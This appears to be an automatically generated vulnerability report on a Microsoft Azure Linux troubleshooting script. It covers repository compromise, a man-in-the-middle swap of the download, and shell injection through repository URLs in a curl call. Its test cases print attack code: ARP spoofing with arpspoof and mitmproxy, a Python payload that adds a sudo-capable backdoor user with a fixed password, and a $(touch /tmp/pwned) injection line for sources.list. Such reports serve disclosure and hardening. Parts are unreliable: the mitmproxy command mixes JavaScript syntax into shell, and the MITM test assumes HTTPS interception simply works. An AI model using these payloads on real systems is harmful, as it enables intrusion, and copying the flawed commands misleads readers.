## Combined Vulnerability List

This document outlines critical security vulnerabilities identified in the updatemanagement project. These vulnerabilities, if exploited, could lead to significant security breaches, including complete system compromise.

### 1. Malicious Code Injection via Repository Compromise

* Description:
    1. An attacker gains unauthorized write access to the GitHub repository `Azure/updatemanagement`.
    2. The attacker modifies the `UM_Linux_Troubleshooter_Offline.py` script within the repository.
    3. The attacker injects malicious code into the script, which could be arbitrary Python code or shell commands.
    4. A user, intending to troubleshoot Azure Update Management, follows the instructions in the `README.md` file.
    5. The user downloads the compromised script using `wget https://raw.githubusercontent.com/Azure/updatemanagement/main/UM_Linux_Troubleshooter_Offline.py`.
    6. The user executes the downloaded script with elevated privileges using `sudo python UM_Linux_Troubleshooter_Offline.py` as instructed in the README.
    7. The Python interpreter executes the compromised script, including the attacker's injected malicious code, with root privileges due to `sudo`.

* Impact:
    - **Complete System Compromise**: Since the script is run with `sudo`, malicious code can execute with root privileges, leading to full control of the affected system.
    - **Data Exfiltration**: The attacker can steal sensitive data from the system.
    - **Malware Installation**: The attacker can install persistent malware, backdoors, or ransomware.
    - **Denial of Service**: Although not the focus, the attacker could also cause a denial of service by modifying the script to consume excessive resources or crash the system.
    - **Privilege Escalation**: The attacker effectively gains root privileges if the user was not already root.

* Vulnerability rank: critical

* Currently implemented mitigations:
    - **Access Control**: The `CONTRIBUTING.md` file restricts contributions to members of the "Azure Update Management" team, limiting the number of potential attackers with direct write access.
    - **Security Reporting Process**: The `SECURITY.md` file provides a process for reporting security vulnerabilities to the Microsoft Security Response Center (MSRC), indicating a commitment to addressing security issues.

* Missing mitigations:
    - **Code Signing**: Implementing code signing for the script would allow users to verify the script's authenticity and integrity before execution. Users could check the signature to ensure the script originated from a trusted source (Microsoft) and hasn't been tampered with.
    - **Checksum Verification**: Providing checksums (e.g., SHA256 hashes) of the script in the `README.md` would enable users to verify the integrity of the downloaded script after downloading but before execution. Users can compare the checksum of the downloaded script with the published checksum to detect any modifications.
    - **강화된 보안 경고 (Strengthened Security Warnings)**: The `README.md` could include a more prominent and explicit security warning about the risks of downloading and executing scripts from the internet, especially with `sudo`, even from seemingly reputable sources. This warning should advise users to carefully review the script's content before execution.
    - **Regular Security Audits**: Implementing regular security audits and code reviews of the script and repository by security experts can help identify and prevent potential vulnerabilities and malicious modifications.
    - **Repository Integrity Monitoring**: Employing tools and processes to monitor the repository for unauthorized changes and suspicious activities can help detect and respond to repository compromises more quickly.

* Preconditions:
    - **Repository Compromise**: The attacker must successfully compromise the GitHub repository and gain write access to modify the `UM_Linux_Troubleshooter_Offline.py` file.
    - **User Download and Execution**: A user must download the compromised script and execute it, following the instructions in the `README.md`.
    - **`sudo` Execution**: The user is highly likely to execute the script with `sudo` as explicitly instructed in the `README.md`, which is a critical precondition for escalating the impact of the vulnerability.

* Source code analysis:
    - The vulnerability is not directly within the Python code of `UM_Linux_Troubleshooter_Offline.py` itself. The script's functionality is to perform system checks using subprocess calls, which are generally safe in this context as the commands are internally defined.
    - The core issue is the distribution method and the instructions provided in `README.md`. The script is hosted in a public repository, and users are instructed to download and execute it with `sudo`.
    - An attacker who gains write access to the repository can replace the legitimate script with a malicious version.
    - When a user downloads and runs this malicious script, the Python interpreter will execute all code within it, including any injected malicious commands, with the elevated privileges granted by `sudo`.
    - There is no input validation or sanitization in the script that could be bypassed to inject commands during runtime. The vulnerability arises from modifying the source code itself in the repository.

* Security test case:
    1. **Setup (Attacker)**: Assume you have compromised the GitHub repository and have write access.
    2. **Modify Script (Attacker)**: Edit the `UM_Linux_Troubleshooter_Offline.py` file in the repository. Add the following malicious code at the beginning of the `main` function (or anywhere that will be executed early in the script):
        ```python
        import os
        os.system('touch /tmp/pwned_by_vuln_report') # Malicious payload to create a file as proof of concept
        ```
        Commit and push these changes to the `main` branch of the repository.
    3. **User Action (Victim)**: On a Linux system, the victim user follows the instructions in `README.md`:
        ```bash
        sudo wget https://raw.githubusercontent.com/Azure/updatemanagement/main/UM_Linux_Troubleshooter_Offline.py
        sudo python UM_Linux_Troubleshooter_Offline.py
        ```
    4. **Verification (Victim)**: After running the commands, check if the file `/tmp/pwned_by_vuln_report` exists on the system:
        ```bash
        ls /tmp/pwned_by_vuln_report
        ```
    5. **Expected Result**: If the file `/tmp/pwned_by_vuln_report` exists, it confirms that the injected malicious code was executed with root privileges when the user ran the downloaded script with `sudo`. This demonstrates the successful exploitation of the Malicious Code Injection via Repository Compromise vulnerability. If the file does not exist, the test case failed, and the vulnerability is not exploitable as described in this test case (though the vulnerability may still exist if the test case was flawed or the malicious code was not properly injected).

### 2. MITM vulnerability during script download

* Description:
    - The `README.md` file provides instructions to download the `UM_Linux_Troubleshooter_Offline.py` script using `wget` over `https` from `raw.githubusercontent.com`.
    - An attacker positioned to perform a Man-in-The-Middle (MITM) attack can intercept the HTTPS request for the script.
    - The attacker can then replace the legitimate `UM_Linux_Troubleshooter_Offline.py` script with a malicious script of their choosing.
    - The user, following the instructions, proceeds to execute the downloaded script using `sudo python UM_Linux_Troubleshooter_Offline.py`, granting the malicious script root privileges.

* Impact:
    - **Critical**. Successful exploitation of this vulnerability allows a remote attacker to execute arbitrary code with root privileges on the victim's machine. This can lead to complete system compromise, including data theft, malware installation, and denial of service.

* Vulnerability Rank: Critical

* Currently Implemented Mitigations:
    - None. The project currently relies on the implicit security of HTTPS for downloading the script, but does not implement any explicit integrity checks.

* Missing Mitigations:
    - **Integrity Verification:** Implement a mechanism to verify the integrity of the downloaded script. This could be achieved by:
        - Providing a checksum (e.g., SHA256 hash) of the script in the `README.md` file and instructing users to verify the checksum after downloading.
        - Digitally signing the script and providing instructions for users to verify the signature before execution.
    - **Security Warning in Documentation:** Explicitly mention the MITM vulnerability risk in the `README.md` and `SECURITY.md` files, warning users about the importance of downloading the script from a trusted and secure network.
    - **Alternative Secure Download Method:** Consider providing alternative secure download methods, such as downloading from a dedicated Azure endpoint with enforced integrity checks, if feasible.

* Preconditions:
    - **MITM Attack Capability:** The attacker must be capable of performing a Man-in-the-Middle attack on the network path between the user's machine and `raw.githubusercontent.com`. This could be achieved in various scenarios, such as:
        - Attacking a public Wi-Fi network.
        - Compromising the user's local network.
        - DNS spoofing.
        - BGP hijacking.
        - Compromising network infrastructure along the route.
    - **User Follows Instructions:** The user must follow the instructions in the `README.md` file to download and execute the script.
    - **User Executes with Sudo:** The user must execute the script using `sudo`, which is part of the provided instructions, to grant elevated privileges to the potential malicious script.

* Source Code Analysis:
    - **`README.md` (Instructions for downloading and running the script):**
        ```markdown
        # to run linux troubleshooter [compatible with python3]
        sudo wget https://raw.githubusercontent.com/Azure/updatemanagement/main/UM_Linux_Troubleshooter_Offline.py
        sudo python UM_Linux_Troubleshooter_Offline.py
        ```
        - The instructions use `wget` to download the script from `raw.githubusercontent.com` over `https`. While HTTPS provides encryption, it does not inherently prevent MITM attacks if the client doesn't verify server certificates properly or if the attacker can compromise the connection before HTTPS is fully established or via other means.
        - **Absence of Integrity Check:** There are no instructions to verify the integrity of the downloaded script before execution. The user directly executes the downloaded script.
        - **`sudo` Execution:** The instructions explicitly use `sudo` to execute the script, which is necessary for many troubleshooting tasks within the script but also elevates the risk significantly if a malicious script is executed.

* Security Test Case:
    1. **Set up MITM Attack Environment:** Configure a machine as a MITM attacker. This can be done using tools like `mitmproxy`, `Ettercap`, or `BetterCAP`. For example, using `mitmproxy`:
        ```bash
        # On attacker machine:
        sudo apt-get install mitmproxy  # Or appropriate installation for your system
        sudo ip route get 1.2.3.4 | awk '{print $3}' # Get gateway IP
        GATEWAY_IP=$(sudo ip route get 1.2.3.4 | awk '{print $3}')
        VICTIM_IP=<victim_machine_ip>
        sudo arpspoof -i <attacker_interface> -t $VICTIM_IP $GATEWAY_IP &
        sudo arpspoof -i <attacker_interface> -t $GATEWAY_IP $VICTIM_IP &
        sudo iptables -P FORWARD ACCEPT # Enable IP forwarding
        mitmproxy --ssl-insecure
        ```
    2. **Create Malicious Script (`malicious_script.py`):** Create a simple malicious Python script that will be used to replace the legitimate script during the MITM attack. For example, to create a backdoor user:
        ```python
        #!/usr/bin/env python
        import os
        import subprocess

        def create_backdoor_user():
            username = "backdoor_user"
            password = "P@$$wOrd123" # Choose a more robust password in real scenarios
            try:
                subprocess.run(["useradd", "-m", "-p", password, "-s", "/bin/bash", username], check=True)
                subprocess.run(["usermod", "-aG", "sudo", username], check=True)
                print(f"Backdoor user '{username}' created with sudo privileges.")
            except subprocess.CalledProcessError as e:
                print(f"Error creating backdoor user: {e}")

        if __name__ == "__main__":
            print("Malicious script executed with root privileges!")
            create_backdoor_user()
        ```
    3. **Configure MITM Proxy to Replace Script:** Configure `mitmproxy` (or your chosen MITM tool) to intercept the request to `raw.githubusercontent.com/Azure/updatemanagement/main/UM_Linux_Troubleshooter_Offline.py` and replace the response with the content of `malicious_script.py`. In `mitmproxy`, you can use a simple inline script or a more complex Python script. For a quick inline script, you can use `sed` to replace the body:
        ```bash
        # Assuming malicious_script.py is in the same directory as mitmproxy command
        MALICIOUS_SCRIPT_CONTENT=$(cat malicious_script.py)
        mitmproxy --ssl-insecure -q -s '(flow) => { if flow.request.pretty_url == "https://raw.githubusercontent.com/Azure/updatemanagement/main/UM_Linux_Troubleshooter_Offline.py": flow.response = mitmproxy.http.Response.make(200, "'"$MALICIOUS_SCRIPT_CONTENT"'", {"Content-Type": "text/plain"}) }'
        ```
    4. **Execute Download Command on Victim Machine:** On the victim machine, execute the download command as instructed in `README.md`:
        ```bash
        sudo wget https://raw.githubusercontent.com/Azure/updatemanagement/main/UM_Linux_Troubleshooter_Offline.py
        ```
    5. **Execute the Script on Victim Machine:** Execute the downloaded script with `sudo`:
        ```bash
        sudo python UM_Linux_Troubleshooter_Offline.py
        ```
    6. **Verify Successful Exploit:** Check if the malicious script was executed with root privileges. In this test case, verify if the backdoor user `backdoor_user` has been created on the victim machine and has sudo privileges:
        ```bash
        id backdoor_user
        sudo -l -U backdoor_user
        ```
        If the user exists and has sudo privileges, the MITM attack and vulnerability exploitation are successful.

### 3. Command Injection via Repository URI in `pingRepos` function

* Vulnerability Name: Command Injection via Repository URI in `pingRepos` function

* Description:
    1. An attacker with write access to repository configuration files (e.g., `/etc/apt/sources.list` for Ubuntu, `/etc/yum.repos.d/` for CentOS/RHEL, `/etc/zypp/repos.d/` for SUSE) can inject a malicious repository URL.
    2. The attacker modifies a repository configuration file, inserting a malicious URL as a repository base URL. This malicious URL contains a shell command injection payload, such as backticks or `$(...)`. For example, for Ubuntu, they could add a line in `/etc/apt/sources.list`: `deb http://`"`$(touch /tmp/pwned)`"` example.com/repo ...` or `deb http://`"`\`touch /tmp/pwned\`"` example.com/repo ...`.
    3. An administrator, following the instructions in the README, executes the `UM_Linux_Troubleshooter_Offline.py` script using `sudo`.
    4. The script runs the `check_access_to_linux_repos` function, which internally calls `RepositoryManager.checkRule`, `RepositoryManager.getConfiguredRepos`, and `RepositoryManager.pingRepos`.
    5. `RepositoryManager.getConfiguredRepos` reads the system's repository configuration files, including the attacker's modified file, and extracts the malicious URL.
    6. `RepositoryManager.pingRepos` iterates through the extracted repository URLs and calls `RepositoryManager.pingEndpoint` for each URL to check network accessibility.
    7. `RepositoryManager.pingEndpoint` constructs a `curl` command by directly concatenating the repository URI without any sanitization: `unixCmd = "curl --head " + uri`.
    8. The `executeCommand` function executes this command with `shell=True` in `subprocess.Popen`. This allows the injected shell command within the malicious URL to be executed. For instance, in the example URL `deb http://`"`$(touch /tmp/pwned)`"` ...`, the command `touch /tmp/pwned` will be executed by the shell.

* Impact:
    - Critical. If the script is executed with `sudo` (as instructed), successful command injection allows the attacker to execute arbitrary commands with root privileges on the system. This could lead to full system compromise, data theft, malware installation, or denial of service.

* Vulnerability Rank: Critical

* Currently Implemented Mitigations:
    - None. The script does not currently implement any sanitization or escaping of repository URLs before using them in shell commands.

* Missing Mitigations:
    - **Input Sanitization:** Sanitize the repository URLs before using them in shell commands. Use proper escaping mechanisms like `shlex.quote` in Python to prevent shell injection.
    - **Avoid `shell=True`:**  Avoid using `shell=True` in `subprocess.Popen` or `subprocess.check_output`. If the shell is necessary, construct the command as a list of arguments and pass `shell=False`. For `curl`, the URL should be passed as a separate argument, not as part of a shell string.

* Preconditions:
    - The attacker must have write access to the repository configuration files on the target Linux system. This could be achieved through various means, such as exploiting other vulnerabilities, social engineering, or insider access.
    - The administrator must execute the `UM_Linux_Troubleshooter_Offline.py` script using `sudo`, as instructed in the project's README file.

* Source Code Analysis:
    - The vulnerability lies in the `RepositoryManager.pingEndpoint` function and the `RepositoryManager.executeCommand` function.

    ```python
    def RepositoryManager.pingEndpoint(self, uri):
        unixCmd = "curl --head " + uri  # [VULNERABLE LINE] URI is directly concatenated into the shell command.
        try:
            (out, err) = self.executeCommand(unixCmd) # Executes the command with shell=True
            ...
        except Exception as e:
            ...

    def RepositoryManager.executeCommand(self, unixCmd):
        proc = subprocess.Popen(unixCmd,      # [VULNERABLE LINE] unixCmd is executed by shell.
                                stdin = subprocess.PIPE,
                                stdout = subprocess.PIPE,
                                stderr = subprocess.PIPE,
                                shell=True      # shell=True enables shell command injection.
                            )
        (out, err) = proc.communicate()
        return (out.decode('utf8', 'ignore'), err.decode('utf8', 'ignore'))
    ```
    - In `pingEndpoint`, the `uri` variable, which is derived from system repository configurations, is directly concatenated into the `curl` command string.
    - The `executeCommand` function then executes this command string using `subprocess.Popen` with `shell=True`. This construction allows shell metacharacters within the `uri` to be interpreted and executed as shell commands, leading to command injection.

* Security Test Case:
    1. **Environment Setup:** Set up a test Ubuntu machine where you have `sudo` privileges.
    2. **Modify Repository Configuration:**
        - Edit the `/etc/apt/sources.list` file using `sudo nano /etc/apt/sources.list` (or your preferred editor with sudo).
        - Add the following line to the file. This line injects a command to create a file `/tmp/pwned` when the URL is processed:
          ```
          deb http://`"`$(touch /tmp/pwned)`"` archive.ubuntu.com/ubuntu focal main restricted universe multiverse
          ```
          *(Note: Replace `archive.ubuntu.com/ubuntu focal main restricted universe multiverse` with a valid repository if needed to avoid apt errors, the crucial part is the injected command `$(touch /tmp/pwned)`)*
        - Save the changes and exit the editor.
    3. **Download the Script:** Download the `UM_Linux_Troubleshooter_Offline.py` script to the test machine using `wget`:
       ```bash
       sudo wget https://raw.githubusercontent.com/Azure/updatemanagement/main/UM_Linux_Troubleshooter_Offline.py
       ```
    4. **Execute the Script:** Run the downloaded script using `sudo`:
       ```bash
       sudo python UM_Linux_Troubleshooter_Offline.py
       ```
    5. **Verify Command Injection:** After the script execution completes, check if the file `/tmp/pwned` has been created.
       ```bash
       ls /tmp/pwned
       ```
       - If the file `/tmp/pwned` exists, this confirms that the command injection vulnerability is successfully exploited, as the `touch /tmp/pwned` command embedded in the malicious repository URL was executed with root privileges due to the script running with `sudo`.
    6. **Cleanup (Optional):** Remove the injected line from `/etc/apt/sources.list` and delete the `/tmp/pwned` file.
